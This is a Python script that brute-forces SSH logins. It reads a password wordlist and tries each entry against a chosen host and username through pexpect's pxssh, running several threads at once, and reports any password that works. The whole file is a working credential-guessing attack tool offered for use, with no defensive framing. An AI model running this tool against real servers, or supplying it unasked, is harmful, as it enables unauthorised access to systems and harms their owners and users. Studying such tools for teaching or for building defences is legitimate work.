from pexpect import pxssh
import optparse
import time
from threading import *
maxConnection = 5
connectionLock = BoundedSemaphore(value=maxConnection)
found = False
Fails = 0

def connect(host, user, password, release):
	global found 
	global Fails
	try:
		s = pxssh.pxssh()
		s.login(host,user,password)
		print ('[+] password found: ' + password)
		found = True
	except Exception as e:
		if 'reading_nonblocking' in str(e):
			Fails += 1
			time.sleep(5)
			connect(host,user,password,False)
		elif 'synchronize with original prompt' in str(e):
			time.sleep(1)
			connect(host,user,password,False)
	finally:
		if release: connectionLock.release()
def main():
	parser = optparse.OptionParser('usage of %prog'+'-H <target host> -u <user> -F <password list>')
	parser.add_option('-H', dest='trgtHost', type='string',help='choose the target')
	parser.add_option('-u', dest='userHost', type='string',help='choose the username')
	parser.add_option('-F', dest='Passhost', type='string',help='choose the password')
	(options, args) = parser.parse_args()
	host = options.trgtHost
	user = options.userHost
	pass_file = options.Passhost

	if host == None or user == None or pass_file == None:
		print (parser.usage)
		exit(2)

	with open(pass_file,'r') as lines:
		for line in lines.readlines():
			if found:
				print ("Existing password found")
				exit(0)
			if Fails > 5:
				print ("[!] Exiting: Too Many Socket Timeouts")
				exit(1)

			connectionLock.acquire()
			password = line.strip('\r').strip('\n')
			print ("[-] Testing: "+str(password))
			t = Thread(target=connect, args=(host, user,password, True))
			child = t.start()
if __name__ == '__main__':
	main()